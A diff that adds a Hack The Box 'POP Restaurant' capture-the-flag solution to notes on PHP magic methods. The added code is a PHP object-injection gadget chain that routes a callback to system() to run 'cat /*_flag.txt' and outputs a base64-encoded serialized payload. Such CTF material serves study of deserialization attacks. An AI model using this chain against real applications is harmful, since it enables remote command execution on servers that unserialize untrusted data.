@@ -110,6 +110,65 @@ __unset() //Called when unset() is used on an inaccessible property.
 __invoke() //Activated when an object is called as a function (e.g., $object()).
 ```
 
+--------------
+
+### HTB POP Restaurant Solution
+
+---------------
+
+- Solution-:
+
+```php
+<?php
+
+//Array helpers
+require_once 'Helpers/ArrayHelpers.php';
+use Helpers\ArrayHelpers;
+
+//Icecream
+class IceCream {
+	public $flavors;
+	public $topping;
+}
+
+//Spaghetti
+
+class Spaghetti
+{
+    public $sauce;
+    public $noodles;
+    public $portion;
+}
+//Trigger point:__destruct
+
+class Pizza {
+	public $price;
+	public $cheese;
+	public $size;
+}
+
+//Array Helpers
+$payload =  new ArrayHelpers(["cat /*_flag.txt"]);
+$payload->callback = 'system';
+
+$icecream =  new IceCream;
+$icecream->flavors = $payload;
+$icecream->topping = 'lolzz';
+
+$spag = new Spaghetti;
+$spag->sauce = $icecream;
+$spag->noodles = 'indomie';
+$spag->portion = '1999';
+
+$pizza = new Pizza;
+$pizza->size = $spag;
+$pizza->cheese = 'nada';
+$pizza->price = '12212';
+
+echo base64_encode(serialize($pizza));
+
+?>
+```
 
 ---------------
 
